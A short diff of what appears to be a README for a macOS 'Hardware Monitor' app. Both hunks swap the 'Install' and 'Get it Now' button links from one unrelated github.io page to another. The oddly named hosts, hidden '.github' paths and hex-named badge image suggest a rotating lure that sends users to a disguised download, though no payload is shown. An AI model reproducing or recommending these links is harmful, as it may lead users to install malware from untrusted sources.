@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/hardwareMonitor)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/hardwareMonitor)
 
 </div>
 
@@ -81,7 +81,7 @@ Hardware Monitor's thermal monitoring serves a different purpose depending on th
 
 <p align="center">
 
-[![Get it Now Hardware Monitor](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/hardwareMonitor)
+[![Get it Now Hardware Monitor](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/hardwareMonitor)
 
 </p>
 
